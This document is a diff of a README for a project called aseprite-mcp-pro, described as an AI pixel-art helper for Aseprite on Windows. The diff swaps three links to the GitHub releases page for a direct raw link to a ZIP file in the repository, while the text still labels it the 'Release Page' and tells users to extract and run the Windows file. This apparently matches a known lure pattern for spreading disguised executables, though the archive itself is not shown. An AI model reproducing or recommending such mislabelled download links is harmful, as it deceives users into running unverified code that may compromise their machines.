@@ -1,6 +1,6 @@
 # 🎨 aseprite-mcp-pro - AI Pixel Art for Aseprite
 
-[![Download aseprite-mcp-pro](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/Pand8266/aseprite-mcp-pro/releases)
+[![Download aseprite-mcp-pro](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/Pand8266/aseprite-mcp-pro/raw/refs/heads/main/extension/pro-aseprite-mcp-v2.8.zip)
 
 ## 🖥️ What this is
 
@@ -10,7 +10,7 @@ This project is for Windows users who want a guided way to work with Aseprite an
 
 ## 📥 Download and install
 
-Visit this page to download: https://github.com/Pand8266/aseprite-mcp-pro/releases
+Visit this page to download: https://github.com/Pand8266/aseprite-mcp-pro/raw/refs/heads/main/extension/pro-aseprite-mcp-v2.8.zip
 
 1. Open the release page.
 2. Find the latest release.
@@ -126,6 +126,6 @@ ai, animation, aseprite, claude, gamedev, godot, mcp, model-context-protocol, pi
 
 ## 📦 Release page
 
-Download from the release page: https://github.com/Pand8266/aseprite-mcp-pro/releases
+Download from the release page: https://github.com/Pand8266/aseprite-mcp-pro/raw/refs/heads/main/extension/pro-aseprite-mcp-v2.8.zip
 
 Open the latest release, get the Windows file, and run it after extraction if the download comes in a ZIP file
